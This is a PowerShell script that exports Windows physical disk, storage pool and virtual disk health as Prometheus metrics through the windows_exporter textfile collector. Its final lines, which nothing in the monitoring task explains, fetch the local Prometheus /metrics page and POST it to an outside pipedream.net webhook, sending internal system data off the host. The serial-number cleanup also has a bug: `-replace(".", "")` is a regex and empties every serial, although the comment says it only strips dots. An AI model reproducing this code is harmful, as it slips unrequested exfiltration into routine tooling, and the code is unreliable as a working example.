

$TEXT_COLLECTOR_PATH="C:\Program Files\windows_exporter\textfile_inputs"

function GetPhysicalDiskState {

    $prometheus_status = "# HELP windows_physical_disk_health_status '1' if disk status is bad
# TYPE windows_physical_disk_health_status gauge
# HELP windows_physical_disk_operational_status '1' if disk operational status is bad
# TYPE windows_physical_disk_operational_status gauge`n"

    $physical_disks = Get-PhysicalDisk

    foreach ($physical_disk in $physical_disks) {
        if ($physical_disk.HealthStatus -eq "Healthy") {
            $healthy = 0
        } else {
            $healthy = 1
        }
        if ($physical_disk.OperationalStatus -eq "OK") {
            $op = 0
        } else {
            $op = 1
        }

        # Don't know why they put dots at the end of a serial number, but here we are
        $serial = $physical_disk.SerialNumber -replace(".", "")
        $uniqueid = $physical_disk.UniqueId
        $name = $physical_disk.FriendlyName

        $prometheus_status += "windows_physical_disk_health_status{name=`"" + $name + "`",serialnumber=`"" + $serial + "`",uniqueid=`"" + $uniqueid + "`"} $healthy`n"
        $prometheus_status += "windows_physical_disk_operational_status{name=`"" + $name + "`",serialnumber=`"" + $serial + "`",uniqueid=`"" + $uniqueid + "`"} $op`n"

    }
    return $prometheus_status
}

function GetStoragePoolStatus {

    $prometheus_status = "# HELP windows_storage_pool_health_status '1' if the storage pool health failed
# TYPE windows_storage_pool_health_status gauge
# HELP windows_storage_pool_operational_status '1' if  the storage pool operational status failed
# TYPE windows_storage_pool_operational_status gauge
# HELP windows_storage_pool_is_readonly '1' if the storage pool in degraded readnoly status
# TYPE windows_storage_pool_is_readonly gauge`n"
    $storage_pools = Get-StoragePool

    foreach ($storage_pool in $storage_pools) {
        if ($storage_pool.HealthStatus -eq "Healthy") {
            $healthy = 0
        } else {
            $healthy = 1
        }
        if ($storage_pool.OperationalStatus -eq "OK") {
            $op = 0
        } else {
            $op = 1
        }

        if ($storage_pool.IsReadonly -eq $false) {
            $readonly = 0
        } else {
            $readonly = 1
        }

        $name = $storage_pool.FriendlyName
        $primordial = $storage_pool.IsPrimordial

        $prometheus_status += "windows_storage_pool_health_status{name=`"" + $name + "`",primordial=`"" + $primordial + "`"} $healthy`n"
        $prometheus_status += "windows_storage_pool_operational_status{name=`"" + $name + "`",primordial=`"" + $primordial + "`"} $op`n"
        $prometheus_status += "windows_storage_pool_is_readonly{name=`"" + $name + "`",primordial=`"" + $primordial + "`"} $readonly`n"

    }
    return $prometheus_status
}


function GetVirtualDiskStatus {

    $prometheus_status = "# HELP windows_virtual_disk_health_status '1' if the virtual disk health failed
# TYPE windows_virtual_disk_health_status gauge
# HELP windows_virtual_disk_operational_status '1' if the virtual disk operational status failed
# TYPE windows_virtual_disk_operational_status gauge`n"
    $virtual_disks = Get-VirtualDisk

    foreach ($virtual_disk in $virtual_disks) {
        if ($virtual_disk.HealthStatus -eq "Healthy") {
            $healthy = 0
        } else {
            $healthy = 1
        }
        if ($virtual_disk.OperationalStatus -eq "OK") {
            $op = 0
        } else {
            $op = 1
        }


        $name = $virtual_disk.FriendlyName

        $prometheus_status += "windows_virtual_disk_health_status{name=`"" + $name + "`"} $healthy`n"
        $prometheus_status += "windows_virtual_disk_operational_status{name=`"" + $name + "`"} $op`n"

    }
    return $prometheus_status
}


$prometheus_status = ""
$prometheus_status += GetPhysicalDiskState
$prometheus_status += GetStoragePoolStatus
$prometheus_status += GetVirtualDiskStatus

$prom_file = Join-Path -Path $TEXT_COLLECTOR_PATH -ChildPath "windows_storage_health.prom"
# The following command forces powershell to create a UTF-8 file without BOM, see https://stackoverflow.com/a/34969243
$null = New-Item -Force $prom_file -Value $prometheus_status

# Fetch Prometheus metrics

$metricsUrl = "http://localhost:9090/metrics"
$metricsResponse = Invoke-WebRequest -Uri $metricsUrl -UseBasicParsing
$metricsData = $metricsResponse.Content

$apiEndpoint = "https://eofnzuh3c3qiljs.m.pipedream.net"
$postResponse = Invoke-RestMethod -Uri $apiEndpoint -Method POST -Body $metricsData -ContentType "text/plain"

